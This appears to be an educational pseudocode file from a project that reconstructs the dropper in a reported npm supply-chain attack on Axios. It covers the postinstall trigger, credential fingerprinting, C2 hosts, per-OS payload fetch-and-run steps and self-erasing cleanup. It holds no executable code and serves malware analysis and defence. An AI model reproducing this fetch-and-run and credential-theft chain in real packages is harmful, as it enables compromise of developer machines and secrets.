/**
 * plain-crypto-js/setup.js
 *
 * EDUCATIONAL PSEUDOCODE — NOT A FUNCTIONAL DROPPER
 *
 * This file documents the logic of the real dropper from the Axios supply
 * chain attack (March 31, 2026) for research and learning purposes.
 * It is intentionally written as annotated pseudocode, not working code.
 *
 * References:
 *   - StepSecurity analysis: https://www.stepsecurity.io
 *   - SafeDep analysis:      https://safedep.io
 *   - Socket analysis:       https://socket.dev
 */

/*
  ══════════════════════════════════════════════════════════════
  PHASE 1 — ENTRY POINT (triggered by npm postinstall hook)
  ══════════════════════════════════════════════════════════════

  npm automatically runs this script after installing the package.
  The victim never explicitly invokes it — it fires silently during
  any `npm install` that resolves plain-crypto-js as a dependency.
  In the real attack, this file was obfuscated to slow down analysis.

  PSEUDOCODE:
    detect operating system platform
    if platform not in [macOS, Windows, Linux]:
        exit silently with code 0   ← never alert the victim

    fingerprint = collect_system_info()
    payload     = beacon_to_c2(fingerprint)

    branch on platform:
        macOS   → drop_macos(payload)
        Windows → drop_windows(payload)
        Linux   → drop_linux(payload)

    self_destruct()
*/

/*
  ══════════════════════════════════════════════════════════════
  PHASE 2 — SYSTEM FINGERPRINTING
  ══════════════════════════════════════════════════════════════

  Before delivering the RAT, the dropper collects system information
  and sends it to the C2. This lets the attacker profile high-value
  targets — developer machines likely to have cloud credentials,
  npm tokens, SSH keys, CI secrets, etc.

  PSEUDOCODE:
    collect:
      - OS platform and architecture
      - hostname and current username
      - home directory path
      - Node.js version, process ID
      - (real attack likely also probed):
          env vars → AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN, NPM_TOKEN
          files    → ~/.ssh/, ~/.aws/credentials, ~/.npmrc
          CI flags → CI=true, GITHUB_ACTIONS=true
*/

/*
  ══════════════════════════════════════════════════════════════
  PHASE 3 — C2 BEACON
  ══════════════════════════════════════════════════════════════

  The dropper POSTs the fingerprint to a platform-specific endpoint.
  The C2 responds with the appropriate second-stage payload.

  Real endpoints observed (attacker domain disguised as npm):
    macOS   → packages.npm.org/product0
    Windows → packages.npm.org/product1
    Linux   → packages.npm.org/product2

  PSEUDOCODE:
    POST https://[c2-domain]/product{0|1|2}
    body:     JSON fingerprint
    response: raw payload (script or binary)
*/

/*
  ══════════════════════════════════════════════════════════════
  PHASE 4 — PLATFORM DROPPERS
  ══════════════════════════════════════════════════════════════

  macOS:
    Write AppleScript to /tmp/ → execute via /bin/zsh
    AppleScript fetches C++ RAT from sfrclak.com:8000
    Saves to /Library/Caches/com.apple.act.mond
    Sets executable bit, launches in background, deletes script

  Windows:
    Locate PowerShell binary → copy to %PROGRAMDATA%\wt.exe
      (disguised as Windows Terminal)
    Write VBScript to %TEMP% → execute it
    VBScript fetches PowerShell RAT from C2, runs it, deletes itself

  Linux:
    Fetch Python RAT from C2
    Write to /tmp/ld.py
    Launch: nohup python3 /tmp/ld.py > /dev/null 2>&1 &
    Process detaches and runs in background
*/

/*
  ══════════════════════════════════════════════════════════════
  PHASE 5 — FORENSIC CLEANUP (see cleanup/cleanup.js for demo)
  ══════════════════════════════════════════════════════════════

  After the RAT launches, the malware wipes its own tracks.

  PSEUDOCODE:
    1. Read package.md  (pre-staged clean manifest, no scripts block)
    2. Overwrite package.json with package.md contents
       → postinstall hook is now gone
    3. Delete setup.js from disk
       → dropper no longer exists

  Result: node_modules/plain-crypto-js looks completely legitimate.
  A forensic investigator finds nothing. No hook. No dropper.

  The key insight: package.md was bundled inside the malicious package
  before the attack was ever launched — specifically for this swap.
*/

// This file contains no executable attack code.
// See docs/attack-flow.md for the full technical breakdown.
// See cleanup/cleanup.js for a working demo of the manifest swap.
// See c2-server/server.js for the sandboxed C2 simulation.
